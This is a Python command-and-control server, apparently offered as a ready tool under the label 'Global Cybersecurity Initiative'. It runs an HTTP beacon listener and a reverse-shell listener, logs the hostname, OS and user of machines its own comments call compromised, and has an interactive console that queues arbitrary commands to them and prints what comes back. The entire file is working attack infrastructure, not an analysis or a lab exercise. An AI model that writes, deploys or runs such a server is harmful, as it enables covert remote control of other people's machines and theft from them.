#!/usr/bin/env python3
"""
Advanced C2 Listener - Global Cybersecurity Initiative
Handles both HTTP beacons and reverse shells
"""

import socket
import threading
import json
import time
import os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

# ===== CONFIGURATION =====
LISTENER_IP = "0.0.0.0"
BEACON_PORT = 8080
SHELL_PORT = 4444

# ===== GLOBALS =====
connected_clients = {}
shell_sessions = {}
commands_queue = {}

# ===== BEACON HANDLER (HTTP) =====


class BeaconHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests - serve basic info"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(
            b"C2 Server Running - Global Cybersecurity Initiative")

    def do_POST(self):
        """Handle POST requests from beacons"""
        if self.path == '/beacon':
            self.handle_beacon()
        else:
            self.send_error(404)

    def handle_beacon(self):
        """Process beacon data from compromised systems"""
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())

            client_id = data.get('hostname', 'unknown')
            client_ip = self.client_address[0]

            # Store/update client info
            connected_clients[client_id] = {
                'ip': client_ip,
                'last_seen': datetime.now(),
                'data': data,
                'type': 'beacon'
            }

            print(f"\n📡 BEACON RECEIVED")
            print(f"   Client: {client_id}")
            print(f"   IP: {client_ip}")
            print(f"   OS: {data.get('os', 'unknown')}")
            print(f"   User: {data.get('user', 'unknown')}")

            # Check for queued commands
            response_data = {'status': 'ok'}
            if client_id in commands_queue and commands_queue[client_id]:
                command = commands_queue[client_id].pop(0)
                response_data = {'status': 'command', 'command': command}
                print(f"   ↳ Command sent: {command}")

            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response_data).encode())

        except Exception as e:
            print(f"Beacon error: {e}")
            self.send_error(500)

    def log_message(self, format, *args):
        """Suppress default HTTP logs"""
        pass


def start_beacon_listener():
    """Start HTTP beacon listener"""
    try:
        server = HTTPServer((LISTENER_IP, BEACON_PORT), BeaconHandler)
        print(f"📡 Beacon listener started on port {BEACON_PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"Beacon listener error: {e}")

# ===== REVERSE SHELL HANDLER =====


def handle_shell_session(client_socket, client_address):
    """Handle individual reverse shell session"""
    session_id = f"{client_address[0]}:{client_address[1]}"
    shell_sessions[session_id] = {
        'socket': client_socket,
        'address': client_address,
        'connected_at': datetime.now()
    }

    print(f"🎯 New shell session: {session_id}")

    try:
        # Receive initial banner
        client_socket.settimeout(2)
        try:
            banner = client_socket.recv(1024).decode()
            print(f"   System info: {banner.strip()}")
        except:
            pass
        client_socket.settimeout(None)

        # Interactive shell loop
        while True:
            try:
                # Check for commands from queue
                if session_id in commands_queue and commands_queue[session_id]:
                    command = commands_queue[session_id].pop(0)
                    client_socket.send(command.encode() + b'\n')

                    # Receive output
                    output = b""
                    client_socket.settimeout(2)
                    while True:
                        try:
                            chunk = client_socket.recv(4096)
                            if not chunk:
                                break
                            output += chunk
                        except socket.timeout:
                            break
                    client_socket.settimeout(None)

                    print(f"\n💻 [{session_id}] $ {command}")
                    print(output.decode())

                time.sleep(1)

            except (BrokenPipeError, ConnectionResetError):
                print(f"❌ Shell session closed: {session_id}")
                break
            except Exception as e:
                print(f"Shell error [{session_id}]: {e}")
                break

    except Exception as e:
        print(f"Shell session error: {e}")
    finally:
        client_socket.close()
        if session_id in shell_sessions:
            del shell_sessions[session_id]


def start_shell_listener():
    """Start reverse shell listener"""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((LISTENER_IP, SHELL_PORT))
        server.listen(5)

        print(f"🔮 Reverse shell listener started on port {SHELL_PORT}")

        while True:
            client_socket, client_address = server.accept()

            # Start new thread for each shell session
            session_thread = threading.Thread(
                target=handle_shell_session,
                args=(client_socket, client_address)
            )
            session_thread.daemon = True
            session_thread.start()

    except Exception as e:
        print(f"Shell listener error: {e}")

# ===== COMMAND INTERFACE =====


def send_command_to_beacon(client_id, command):
    """Queue command for beacon client"""
    if client_id not in commands_queue:
        commands_queue[client_id] = []
    commands_queue[client_id].append(command)
    print(f"📤 Command queued for {client_id}: {command}")


def send_command_to_shell(session_id, command):
    """Queue command for shell session"""
    if session_id not in commands_queue:
        commands_queue[session_id] = []
    commands_queue[session_id].append(command)
    print(f"📤 Command queued for shell {session_id}: {command}")


def interactive_console():
    """Main interactive command console"""
    while True:
        try:
            print("\n" + "="*60)
            print("🛡️  GLOBAL CYBERSECURITY INITIATIVE - C2 CONSOLE")
            print("="*60)

            # Show connected clients
            if connected_clients:
                print("\n📡 BEACON CLIENTS:")
                for i, (client_id, info) in enumerate(connected_clients.items(), 1):
                    age = (datetime.now() - info['last_seen']).total_seconds()
                    print(
                        f"  {i}. {client_id} [{info['ip']}] - {info['data'].get('os', 'unknown')} - {age:.0f}s ago")

            if shell_sessions:
                print("\n🔮 SHELL SESSIONS:")
                for i, (session_id, info) in enumerate(shell_sessions.items(), 1):
                    age = (datetime.now() -
                           info['connected_at']).total_seconds()
                    print(f"  {i}. {session_id} - {age:.0f}s connected")

            if not connected_clients and not shell_sessions:
                print("\n⏳ Waiting for connections...")
                time.sleep(5)
                continue

            print("\n🎯 COMMANDS:")
            print("  beacon <client_id> <command>  - Send to beacon client")
            print("  shell <session_id> <command>  - Send to shell session")
            print("  refresh                         - Refresh list")
            print("  exit                           - Exit listener")

            choice = input("\nC2> ").strip().split()

            if not choice:
                continue

            if choice[0] == 'exit':
                print("👋 Shutting down...")
                os._exit(0)

            elif choice[0] == 'refresh':
                continue

            elif choice[0] == 'beacon' and len(choice) >= 3:
                client_id = choice[1]
                command = ' '.join(choice[2:])
                if client_id in connected_clients:
                    send_command_to_beacon(client_id, command)
                else:
                    print(f"❌ Client {client_id} not found")

            elif choice[0] == 'shell' and len(choice) >= 3:
                session_id = choice[1]
                command = ' '.join(choice[2:])
                if session_id in shell_sessions:
                    send_command_to_shell(session_id, command)
                else:
                    print(f"❌ Shell session {session_id} not found")

            else:
                print("❌ Invalid command")

        except KeyboardInterrupt:
            print("\n👋 Shutting down...")
            os._exit(0)
        except Exception as e:
            print(f"Console error: {e}")

# ===== MAIN =====


def main():
    print("🚀 Starting Advanced C2 Listener...")
    print(f"📍 Beacon URL: http://YOUR_SERVER:{BEACON_PORT}/beacon")
    print(f"📍 Shell Port: {SHELL_PORT}")
    print("⏳ Waiting for connections...\n")

    # Start beacon listener thread
    beacon_thread = threading.Thread(target=start_beacon_listener)
    beacon_thread.daemon = True
    beacon_thread.start()

    # Start shell listener thread
    shell_thread = threading.Thread(target=start_shell_listener)
    shell_thread.daemon = True
    shell_thread.start()

    # Wait a moment for listeners to start
    time.sleep(2)

    # Start interactive console
    interactive_console()


if __name__ == "__main__":
    main()
